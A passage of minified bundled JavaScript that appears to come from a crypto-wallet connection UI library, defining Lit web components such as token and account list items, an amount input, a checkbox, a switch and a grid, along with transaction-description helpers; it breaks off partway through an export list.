    `}visualTemplate(){return this.tokenName&&this.tokenImageUrl?F`<wui-image alt=${this.tokenName} src=${this.tokenImageUrl}></wui-image>`:F`<wui-icon name="coinPlaceholder" color="fg-100"></wui-icon>`}};jd.styles=[ht,fr,eOe];w2([V()],jd.prototype,"tokenName",void 0);w2([V()],jd.prototype,"tokenImageUrl",void 0);w2([V({type:Number})],jd.prototype,"tokenValue",void 0);w2([V()],jd.prototype,"tokenAmount",void 0);w2([V()],jd.prototype,"tokenCurrency",void 0);w2([V({type:Boolean})],jd.prototype,"clickable",void 0);jd=w2([me("wui-list-token")],jd);const tOe=ge`
  button {
    width: 100%;
    display: flex;
    gap: var(--wui-spacing-s);
    align-items: center;
    justify-content: flex-start;
    padding: var(--wui-spacing-s) var(--wui-spacing-m) var(--wui-spacing-s) var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon-box {
    width: var(--wui-spacing-2xl);
    height: var(--wui-spacing-2xl);
  }

  wui-flex {
    width: auto;
  }
`;var kp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let vu=class extends he{constructor(){super(...arguments),this.icon="card",this.text="",this.description="",this.tag=void 0,this.iconBackgroundColor="accent-100",this.iconColor="accent-100",this.disabled=!1}render(){return F`
      <button ?disabled=${this.disabled}>
        <wui-icon-box
          iconColor=${this.iconColor}
          backgroundColor=${this.iconBackgroundColor}
          size="inherit"
          icon=${this.icon}
          iconSize="md"
        ></wui-icon-box>
        <wui-flex flexDirection="column" justifyContent="spaceBetween">
          ${this.titleTemplate()}
          <wui-text variant="small-400" color="fg-200"> ${this.description}</wui-text></wui-flex
        >
      </button>
    `}titleTemplate(){return this.tag?F` <wui-flex alignItems="center" gap="xxs"
        ><wui-text variant="paragraph-500" color="fg-100">${this.text}</wui-text
        ><wui-tag tagType="main" size="md">${this.tag}</wui-tag>
      </wui-flex>`:F`<wui-text variant="paragraph-500" color="fg-100">${this.text}</wui-text>`}};vu.styles=[ht,fr,tOe];kp([V()],vu.prototype,"icon",void 0);kp([V()],vu.prototype,"text",void 0);kp([V()],vu.prototype,"description",void 0);kp([V()],vu.prototype,"tag",void 0);kp([V()],vu.prototype,"iconBackgroundColor",void 0);kp([V()],vu.prototype,"iconColor",void 0);kp([V({type:Boolean})],vu.prototype,"disabled",void 0);vu=kp([me("wui-list-description")],vu);const rOe=/[.*+?^${}()|[\]\\]/gu,iOe=/[0-9,.]/u,nOe=ge`
  :host {
    position: relative;
    display: inline-block;
  }

  input {
    background: transparent;
    width: 100%;
    height: auto;
    font-family: var(--wui-font-family);
    color: var(--wui-color-fg-100);

    font-feature-settings: 'case' on;
    font-size: 32px;
    font-weight: var(--wui-font-weight-light);
    caret-color: var(--wui-color-accent-100);
    line-height: 130%;
    letter-spacing: -1.28px;
    box-sizing: border-box;
    -webkit-appearance: none;
    -moz-appearance: textfield;
    padding: 0px;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input::placeholder {
    color: var(--wui-color-fg-275);
  }
`;var PC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let hg=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.disabled=!1,this.value="",this.placeholder="0"}render(){return this.inputElementRef?.value&&this.value&&(this.inputElementRef.value.value=this.value),F`<input
      ${mc(this.inputElementRef)}
      type="text"
      inputmode="decimal"
      pattern="[0-9,.]*"
      placeholder=${this.placeholder}
      ?disabled=${this.disabled}
      autofocus
      value=${this.value??""}
      @input=${this.dispatchInputChangeEvent.bind(this)}
    /> `}dispatchInputChangeEvent(e){const t=e.data;if(t&&this.inputElementRef?.value)if(t===","){const i=this.inputElementRef.value.value.replace(",",".");this.inputElementRef.value.value=i,this.value=`${this.value}${i}`}else iOe.test(t)||(this.inputElementRef.value.value=this.value.replace(new RegExp(t.replace(rOe,"\\$&"),"gu"),""));this.dispatchEvent(new CustomEvent("inputChange",{detail:this.inputElementRef.value?.value,bubbles:!0,composed:!0}))}};hg.styles=[ht,fr,nOe];PC([V({type:Boolean})],hg.prototype,"disabled",void 0);PC([V({type:String})],hg.prototype,"value",void 0);PC([V({type:String})],hg.prototype,"placeholder",void 0);hg=PC([me("wui-input-amount")],hg);const sOe=ge`
  :host {
    display: flex;
    gap: var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    padding: var(--wui-spacing-2xs) var(--wui-spacing-xs) var(--wui-spacing-2xs)
      var(--wui-spacing-s);
    align-items: center;
  }

  wui-avatar,
  wui-icon,
  wui-image {
    width: 32px;
    height: 32px;
    border: 1px solid var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-002);
  }
`;var A4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let pp=class extends he{constructor(){super(...arguments),this.text="",this.address="",this.isAddress=!1}render(){return F`<wui-text variant="large-500" color="fg-100">${this.text}</wui-text>
      ${this.imageTemplate()}`}imageTemplate(){return this.isAddress?F`<wui-avatar address=${this.address} .imageSrc=${this.imageSrc}></wui-avatar>`:this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:F`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};pp.styles=[ht,fr,sOe];A4([V()],pp.prototype,"text",void 0);A4([V()],pp.prototype,"address",void 0);A4([V()],pp.prototype,"imageSrc",void 0);A4([V({type:Boolean})],pp.prototype,"isAddress",void 0);pp=A4([me("wui-preview-item")],pp);const oOe=ge`
  button {
    padding: 6.5px var(--wui-spacing-l) 6.5px var(--wui-spacing-xs);
    display: flex;
    justify-content: space-between;
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    background-color: var(--wui-color-gray-glass-002);
  }

  button[data-clickable='false'] {
    pointer-events: none;
    background-color: transparent;
  }

  wui-image {
    width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-avatar {
    width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
    box-shadow: 0 0 0 0;
  }
  .address {
    color: var(--wui-color-fg-base-100);
  }
  .address-description {
    text-transform: capitalize;
    color: var(--wui-color-fg-base-200);
  }

  wui-icon-box {
    position: relative;
    right: 15px;
    top: 15px;
    border: 2px solid var(--wui-color-bg-150);
    background-color: var(--wui-color-bg-125);
  }
`;var I4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let gp=class extends he{constructor(){super(...arguments),this.accountAddress="",this.accountType="",this.labels=Se.state.addressLabels,this.caipNetwork=re.state.activeCaipNetwork,this.socialProvider=He.getConnectedSocialProvider(),this.balance=0,this.fetchingBalance=!0,this.shouldShowIcon=!1,this.selected=!1}connectedCallback(){super.connectedCallback(),Lt.getBalance(this.accountAddress,this.caipNetwork?.caipNetworkId).then(e=>{let t=this.balance;e.balances.length>0&&(t=e.balances.reduce((i,n)=>i+(n?.value||0),0)),this.balance=t,this.fetchingBalance=!1,this.requestUpdate()}).catch(()=>{this.fetchingBalance=!1,this.requestUpdate()})}render(){const e=this.getLabel(),t=re.state.activeChain,i=He.getConnectedConnectorId(t);return this.shouldShowIcon=i===Me.CONNECTOR_ID.AUTH,F`
      <wui-flex
        flexDirection="row"
        justifyContent="space-between"
        .padding=${["0","0","s","1xs"]}
      >
        <wui-flex gap="md" alignItems="center">
          <wui-avatar address=${this.accountAddress}></wui-avatar>
          ${this.shouldShowIcon?F`<wui-icon-box
                size="sm"
                iconcolor="fg-200"
                backgroundcolor="fg-300"
                icon=${this.accountType===vr.ACCOUNT_TYPES.EOA?this.socialProvider??"mail":"lightbulb"}
                background="fg-300"
              ></wui-icon-box>`:F`<wui-flex .padding="${["0","0","0","s"]}"></wui-flex>`}
          <wui-flex flexDirection="column">
            <wui-text class="address" variant="paragraph-500" color="fg-100"
              >${Wt.getTruncateString({string:this.accountAddress,charsStart:4,charsEnd:6,truncate:"middle"})}</wui-text
            >
            <wui-text class="address-description" variant="small-400">${e}</wui-text></wui-flex
          >
        </wui-flex>
        <wui-flex gap="s" alignItems="center">
          <slot name="action"></slot>
          ${this.fetchingBalance?F`<wui-loading-spinner size="sm" color="accent-100"></wui-loading-spinner>`:F` <wui-text variant="small-400">$${this.balance.toFixed(2)}</wui-text>`}
        </wui-flex>
      </wui-flex>
    `}getLabel(){let e=this.labels?.get(this.accountAddress);const t=re.state.activeChain,i=He.getConnectedConnectorId(t);return!e&&i===Me.CONNECTOR_ID.AUTH?e=`${this.accountType==="eoa"?this.socialProvider??"Email":"Smart"} Account`:e||(e="EOA"),e}};gp.styles=[ht,fr,oOe];I4([V()],gp.prototype,"accountAddress",void 0);I4([V()],gp.prototype,"accountType",void 0);I4([V({type:Boolean})],gp.prototype,"selected",void 0);I4([V({type:Function})],gp.prototype,"onSelect",void 0);gp=I4([me("wui-list-account")],gp);const aOe=ge`
  :host {
    position: relative;
  }

  button {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 48px;
    width: 100%;
    background-color: var(--wui-color-accent-glass-010);
    border-radius: var(--wui-border-radius-xs);
    border: 1px solid var(--wui-color-accent-glass-010);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  wui-tooltip {
    padding: 7px var(--wui-spacing-s) 8px var(--wui-spacing-s);
    position: absolute;
    top: -8px;
    left: 50%;
    transform: translate(-50%, -100%);
    opacity: 0;
    display: none;
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }
  }
`;var VR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Hw=class extends he{constructor(){super(...arguments),this.text="",this.icon="card"}render(){return F`<button>
      <wui-icon color="accent-100" name=${this.icon} size="lg"></wui-icon>
    </button>`}};Hw.styles=[ht,fr,aOe];VR([V()],Hw.prototype,"text",void 0);VR([V()],Hw.prototype,"icon",void 0);Hw=VR([me("wui-icon-button")],Hw);const cOe=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 16.5px var(--wui-spacing-l) 16.5px var(--wui-spacing-xs);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
    justify-content: center;
    align-items: center;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }
`;var $C=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let fg=class extends he{constructor(){super(...arguments),this.text="",this.disabled=!1,this.tabIdx=void 0}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        <wui-text align="center" variant="paragraph-500" color="inherit">${this.text}</wui-text>
      </button>
    `}};fg.styles=[ht,fr,cOe];$C([V()],fg.prototype,"text",void 0);$C([V({type:Boolean})],fg.prototype,"disabled",void 0);$C([V()],fg.prototype,"tabIdx",void 0);fg=$C([me("wui-list-button")],fg);const lOe=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    justify-content: flex-start;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  wui-text {
    text-transform: capitalize;
  }

  wui-text[data-align='left'] {
    display: flex;
    flex: 1;
  }

  wui-text[data-align='center'] {
    display: flex;
    flex: 1;
    justify-content: center;
  }

  .invisible {
    opacity: 0;
    pointer-events: none;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }
`;var P3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let m0=class extends he{constructor(){super(...arguments),this.logo="google",this.name="Continue with google",this.align="left",this.disabled=!1}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        <wui-logo logo=${this.logo}></wui-logo>
        <wui-text
          data-align=${this.align}
          variant="paragraph-500"
          color="inherit"
          align=${this.align}
          >${this.name}</wui-text
        >
        ${this.templatePlacement()}
      </button>
    `}templatePlacement(){return this.align==="center"?F` <wui-logo class="invisible" logo=${this.logo}></wui-logo>`:null}};m0.styles=[ht,fr,lOe];P3([V()],m0.prototype,"logo",void 0);P3([V()],m0.prototype,"name",void 0);P3([V()],m0.prototype,"align",void 0);P3([V()],m0.prototype,"tabIdx",void 0);P3([V({type:Boolean})],m0.prototype,"disabled",void 0);m0=P3([me("wui-list-social")],m0);const uOe=ge`
  button {
    display: block;
    display: flex;
    align-items: center;
    padding: var(--wui-spacing-xxs);
    gap: var(--wui-spacing-xxs);
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-md);
    border-radius: var(--wui-border-radius-xxs);
  }

  wui-image {
    border-radius: 100%;
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  wui-icon-box {
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  button:active {
    background-color: var(--wui-color-gray-glass-005);
  }
`;var Ree=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let iy=class extends he{constructor(){super(...arguments),this.imageSrc=""}render(){return F`<button>
      ${this.imageTemplate()}
      <wui-icon size="xs" color="fg-200" name="chevronBottom"></wui-icon>
    </button>`}imageTemplate(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt="select visual"></wui-image>`:F`<wui-icon-box
      size="xxs"
      iconColor="fg-200"
      backgroundColor="fg-100"
      background="opaque"
      icon="networkPlaceholder"
    ></wui-icon-box>`}};iy.styles=[ht,fr,b4,uOe];Ree([V()],iy.prototype,"imageSrc",void 0);iy=Ree([me("wui-select")],iy);const dOe=ge`
  label {
    display: flex;
    align-items: center;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    column-gap: var(--wui-spacing-1xs);
  }

  label > input[type='checkbox'] {
    height: 0;
    width: 0;
    opacity: 0;
    pointer-events: none;
    position: absolute;
  }

  label > span {
    width: var(--wui-spacing-xl);
    height: var(--wui-spacing-xl);
    min-width: var(--wui-spacing-xl);
    min-height: var(--wui-spacing-xl);
    border-radius: var(--wui-border-radius-3xs);
    border-width: 1px;
    border-style: solid;
    border-color: var(--wui-color-gray-glass-010);
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color;
  }

  label > span:hover,
  label > input[type='checkbox']:focus-visible + span {
    background-color: var(--wui-color-gray-glass-010);
  }

  label input[type='checkbox']:checked + span {
    background-color: var(--wui-color-blue-base-90);
  }

  label > span > wui-icon {
    opacity: 0;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: opacity;
  }

  label > input[type='checkbox']:checked + span wui-icon {
    opacity: 1;
  }
`;var Oee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ny=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.checked=void 0}render(){return F`
      <label>
        <input
          ${mc(this.inputElementRef)}
          ?checked=${ye(this.checked)}
          type="checkbox"
          @change=${this.dispatchChangeEvent}
        />
        <span>
          <wui-icon name="checkmarkBold" color="inverse-100" size="xxs"></wui-icon>
        </span>
        <slot></slot>
      </label>
    `}dispatchChangeEvent(){this.dispatchEvent(new CustomEvent("checkboxChange",{detail:this.inputElementRef.value?.checked,bubbles:!0,composed:!0}))}};ny.styles=[ht,dOe];Oee([V({type:Boolean})],ny.prototype,"checked",void 0);ny=Oee([me("wui-checkbox")],ny);const hOe=ge`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  label {
    position: relative;
    display: inline-block;
    width: 32px;
    height: 22px;
  }

  input {
    width: 0;
    height: 0;
    opacity: 0;
  }

  span {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: var(--wui-color-blue-100);
    border-width: 1px;
    border-style: solid;
    border-color: var(--wui-color-gray-glass-002);
    border-radius: 999px;
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color;
  }

  span:before {
    position: absolute;
    content: '';
    height: 16px;
    width: 16px;
    left: 3px;
    top: 2px;
    background-color: var(--wui-color-inverse-100);
    transition: transform var(--wui-ease-inout-power-1) var(--wui-duration-lg);
    will-change: transform;
    border-radius: 50%;
  }

  input:checked + span {
    border-color: var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-blue-100);
  }

  input:not(:checked) + span {
    background-color: var(--wui-color-gray-glass-010);
  }

  input:checked + span:before {
    transform: translateX(calc(100% - 7px));
  }
`;var Bee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let sy=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.checked=void 0}render(){return F`
      <label>
        <input
          ${mc(this.inputElementRef)}
          type="checkbox"
          ?checked=${ye(this.checked)}
          @change=${this.dispatchChangeEvent.bind(this)}
        />
        <span></span>
      </label>
    `}dispatchChangeEvent(){this.dispatchEvent(new CustomEvent("switchChange",{detail:this.inputElementRef.value?.checked,bubbles:!0,composed:!0}))}};sy.styles=[ht,fr,b4,hOe];Bee([V({type:Boolean})],sy.prototype,"checked",void 0);sy=Bee([me("wui-switch")],sy);const fOe=ge`
  :host {
    height: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: center;
    column-gap: var(--wui-spacing-1xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
    cursor: pointer;
  }

  wui-switch {
    pointer-events: none;
  }
`;var Mee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let oy=class extends he{constructor(){super(...arguments),this.checked=void 0}render(){return F`
      <button>
        <wui-icon size="xl" name="walletConnectBrown"></wui-icon>
        <wui-switch ?checked=${ye(this.checked)}></wui-switch>
      </button>
    `}};oy.styles=[ht,fr,fOe];Mee([V({type:Boolean})],oy.prototype,"checked",void 0);oy=Mee([me("wui-certified-switch")],oy);const pOe=ge`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
`;var yl=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Qo=class extends he{render(){return this.style.cssText=`
      grid-template-rows: ${this.gridTemplateRows};
      grid-template-columns: ${this.gridTemplateColumns};
      justify-items: ${this.justifyItems};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      align-content: ${this.alignContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Wt.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Wt.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Wt.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Wt.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Wt.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Wt.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Wt.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Wt.getSpacingStyles(this.margin,3)};
    `,F`<slot></slot>`}};Qo.styles=[ht,pOe];yl([V()],Qo.prototype,"gridTemplateRows",void 0);yl([V()],Qo.prototype,"gridTemplateColumns",void 0);yl([V()],Qo.prototype,"justifyItems",void 0);yl([V()],Qo.prototype,"alignItems",void 0);yl([V()],Qo.prototype,"justifyContent",void 0);yl([V()],Qo.prototype,"alignContent",void 0);yl([V()],Qo.prototype,"columnGap",void 0);yl([V()],Qo.prototype,"rowGap",void 0);yl([V()],Qo.prototype,"gap",void 0);yl([V()],Qo.prototype,"padding",void 0);yl([V()],Qo.prototype,"margin",void 0);Qo=yl([me("wui-grid")],Qo);const gOe=ge`
  :host {
    position: relative;
    display: flex;
    width: 100%;
    height: 1px;
    background-color: var(--wui-color-gray-glass-005);
    justify-content: center;
    align-items: center;
  }

  :host > wui-text {
    position: absolute;
    padding: 0px 10px;
    background-color: var(--wui-color-modal-bg);
    transition: background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color;
  }
`;var Dee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ay=class extends he{constructor(){super(...arguments),this.text=""}render(){return F`${this.template()}`}template(){return this.text?F`<wui-text variant="small-500" color="fg-200">${this.text}</wui-text>`:null}};ay.styles=[ht,gOe];Dee([V()],ay.prototype,"text",void 0);ay=Dee([me("wui-separator")],ay);const C1={interpolate(r,e,t){if(r.length!==2||e.length!==2)throw new Error("inputRange and outputRange must be an array of length 2");const i=r[0]||0,n=r[1]||0,s=e[0]||0,o=e[1]||0;return t<i?s:t>n?o:(o-s)/(n-i)*(t-i)+s}},mOe=3,wOe=["receive","deposit","borrow","claim"],bOe=["withdraw","repay","burn"],Of={getTransactionGroupTitle(r,e){const t=V9.getYear(),i=V9.getMonthNameByIndex(e);return r===t?i:`${i} ${r}`},getTransactionImages(r){const[e,t]=r,i=!!e&&r?.every(o=>!!o.nft_info),n=r?.length>1;return r?.length===2&&!i?[this.getTransactionImage(e),this.getTransactionImage(t)]:n?r.map(o=>this.getTransactionImage(o)):[this.getTransactionImage(e)]},getTransactionImage(r){return{type:Of.getTransactionTransferTokenType(r),url:Of.getTransactionImageURL(r)}},getTransactionImageURL(r){let e;const t=!!r?.nft_info,i=!!r?.fungible_info;return r&&t?e=r?.nft_info?.content?.preview?.url:r&&i&&(e=r?.fungible_info?.icon?.url),e},getTransactionTransferTokenType(r){if(r?.fungible_info)return"FUNGIBLE";if(r?.nft_info)return"NFT"},getTransactionDescriptions(r){const e=r?.metadata?.operationType,t=r?.transfers,i=r?.transfers?.length>0,n=r?.transfers?.length>1,s=i&&t?.every(d=>!!d?.fungible_info),[o,a]=t;let c=this.getTransferDescription(o),l=this.getTransferDescription(a);if(!i)return(e==="send"||e==="receive")&&s?(c=Wt.getTruncateString({string:r?.metadata.sentFrom,charsStart:4,charsEnd:6,truncate:"middle"}),l=Wt.getTruncateString({string:r?.metadata.sentTo,charsStart:4,charsEnd:6,truncate:"middle"}),[c,l]):[r.metadata.status];if(n)return t.map(d=>this.getTransferDescription(d));let u="";return wOe.includes(e)?u="+":bOe.includes(e)&&(u="-"),c=u.concat(c),[c]},getTransferDescription(r){let e="";return r&&(r?.nft_info?e=r?.nft_info?.name||"-":r?.fungible_info&&(e=this.getFungibleTransferDescription(r)||"-")),e},getFungibleTransferDescription(r){return r?[this.getQuantityFixedValue(r?.quantity.numeric),r?.fungible_info?.symbol].join(" ").trim():null},getQuantityFixedValue(r){return r?parseFloat(r).toFixed(mOe):null}},vOe=Object.freeze(Object.defineProperty({__proto__:null,MathUtil:C1,TransactionUtil:Of,UiHelperUtil:Wt,get WuiAccountButton(){return Oa},get WuiAlertBar(){return fp},get WuiAllWalletsImage(){return Jv},get WuiAvatar(){return lp},get WuiBalance(){return qw},get WuiBanner(){return Ww},get WuiBannerImg(){return dg},get WuiButton(){return pc},get WuiCard(){return p7},get WuiCardSelect(){return Bd},get WuiCardSelectLoader(){return Qv},get WuiCertifiedSwitch(){return oy},get WuiCheckBox(){return ny},get WuiChip(){return ol},get WuiChipButton(){return Ud},get WuiCompatibleNetwork(){return zw},get WuiConnectButton(){return Mw},get WuiCtaButton(){return rg},get WuiDetailsGroup(){return m7},get WuiDetailsGroupItem(){return Xv},get WuiDropdownMenu(){return Dw},get WuiEmailInput(){return up},get WuiEnsInput(){return dp},get WuiFlex(){return Lo},get WuiGrid(){return Qo},get WuiIcon(){return eg},get WuiIconBox(){return sl},get WuiIconButton(){return Hw},get WuiIconLink(){return hp},get WuiImage(){return tg},get WuiInputAmount(){return hg},get WuiInputElement(){return ey},get WuiInputNumeric(){return Lw},get WuiInputText(){return wc},get WuiLink(){return ig},get WuiListAccordion(){return Fw},get WuiListAccount(){return gp},get WuiListButton(){return fg},get WuiListContent(){return ug},get WuiListDescription(){return vu},get WuiListItem(){return Ba},get WuiListNetwork(){return f0},get WuiListSocial(){return m0},get WuiListToken(){return jd},get WuiListWallet(){return Uo},get WuiListWalletTransaction(){return p0},get WuiLoadingHexagon(){return g7},get WuiLoadingSpinner(){return Rw},get WuiLoadingThumbnail(){return Yv},get WuiLogo(){return ty},get WuiLogoSelect(){return ng},get WuiNetworkButton(){return sg},get WuiNetworkImage(){return Od},get WuiNoticeCard(){return lg},get WuiOtp(){return og},get WuiPreviewItem(){return pp},get WuiProfileButton(){return g0},get WuiProfileButtonV2(){return Ld},get WuiPromo(){return ry},get WuiQrCode(){return al},get WuiSearchBar(){return v7},get WuiSelect(){return iy},get WuiSeparator(){return ay},get WuiShimmer(){return ap},get WuiSnackbar(){return Dd},get WuiSwitch(){return sy},get WuiTabs(){return wu},get WuiTag(){return Uw},get WuiText(){return cp},get WuiTokenButton(){return jw},get WuiTokenListItem(){return bu},get 